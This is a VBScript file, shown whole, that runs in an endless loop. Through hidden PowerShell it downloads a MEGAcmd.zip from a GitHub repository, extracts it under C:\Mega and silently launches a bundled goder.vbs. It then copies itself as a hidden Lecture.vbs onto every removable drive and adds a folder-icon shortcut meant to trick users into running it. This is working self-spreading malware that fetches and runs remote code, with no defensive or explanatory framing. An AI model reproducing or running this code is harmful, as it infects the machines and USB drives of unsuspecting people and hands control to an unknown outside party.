Dim objFSO, objShell
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
Do
    Dim megaFolderPath
    megaFolderPath = "C:\Mega"
    If Not objFSO.FolderExists(megaFolderPath) Then
        objFSO.CreateFolder(megaFolderPath)
    End If
    Dim zipFilePath, url, MegacmdPath
    MegacmdPath = megaFolderPath & "\MEGAcmd"
    zipFilePath = megaFolderPath & "\MEGAcmd.zip"
    url = "https://github.com/snxerame/Mega/raw/main/MEGAcmd.zip"
    If Not objFSO.FolderExists(MegacmdPath) Then
        objShell.Run "powershell -command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFilePath & "')""", 0, True
        Do While Not objFSO.FileExists(zipFilePath)
            WScript.Sleep 1000
        Loop        
         objShell.Run "powershell -command ""Expand-Archive -Path """ & zipFilePath & """ -DestinationPath C:\Mega""", 0, False
        WScript.Sleep 1000
        Dim zipFileSize, extractedFolderSize
        zipFileSize = objFSO.GetFile(zipFilePath).Size
        Do
            extractedFolderSize = GetFolderSize(MegacmdPath)
            WScript.Sleep 1000
        Loop While extractedFolderSize < zipFileSize
    End If
    Dim objExec, goderExecuted
    goderExecuted = False
    If Not goderExecuted Then
        objShell.Run "cmd /c C: && cd " & megaFolderPath & "\MEGAcmd && goder.vbs", 0, False
        goderExecuted = True
    End If
    Dim driveLetter, removableDrivePath, lectureOnDrivePath, shortcutPath
    For Each drive In objFSO.Drives
        If drive.DriveType = 1 Then
            driveLetter = drive.Path
            removableDrivePath = driveLetter & "\"
            lectureOnDrivePath = removableDrivePath & "Lecture.vbs"
            shortcutPath = removableDrivePath & "Lecture.lnk"
            If Not objFSO.FileExists(lectureOnDrivePath) Then
                Dim lectureInStartupPath
                lectureInStartupPath = objShell.CurrentDirectory & "\Lecture.vbs"
                objFSO.CopyFile lectureInStartupPath, lectureOnDrivePath
                Dim objLink
                Set objLink = objShell.CreateShortcut(shortcutPath)
                objLink.TargetPath = lectureOnDrivePath
                objLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll, 3"
                objLink.Save
                objShell.Run "cmd /c attrib +h """ & lectureOnDrivePath & """", 0, True
                WScript.Echo "Lecture.vbs hidden on removable drive."
            End If
        End If
    Next  
    WScript.Sleep 5000
Loop

Function GetFolderSize(folderPath)
    Dim objFolder, objFile, totalSize
    totalSize = 0
    Set objFolder = objFSO.GetFolder(folderPath)
    For Each objFile In objFolder.Files
        totalSize = totalSize + objFile.Size
    Next
    GetFolderSize = totalSize
End Function
